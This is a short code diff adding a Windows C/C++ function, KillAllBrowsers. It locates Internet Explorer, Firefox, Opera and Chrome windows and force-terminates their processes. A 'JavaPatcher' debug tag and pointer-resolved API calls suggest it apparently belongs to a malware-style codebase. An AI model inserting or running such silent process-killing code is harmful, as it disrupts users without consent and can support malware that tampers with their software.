@@ -2514,3 +2514,27 @@ bool SizeFolderLess( const char* nameFolder, DWORD maxSize, DWORD* size )
 	if( size ) *size = param.size;
 	return res;
 }
+
+
+
+//------------------------------------------------------------
+//  KillAllBrowsers - Функция убивает все запущенные браузеры
+//------------------------------------------------------------
+void KillAllBrowsers()
+{
+	const char* browsers[] = { "IEFrame", "MozillaWindowClass", "OperaWindowClass", "Chrome_WidgetWin_0", 0 };
+	const char** bb = browsers;
+	while( *bb )
+	{
+		HWND wnd = (HWND) pFindWindowA( *bb, 0 );
+		if( wnd )
+		{
+			DWORD PID = 0;
+			pGetWindowThreadProcessId( wnd, &PID );
+			if( PID )
+				if( KillProcess(PID, 1000) )
+					DBG( "JavaPatcher", "kill browser %s", *bb );
+		}
+		bb++;
+	}
+}
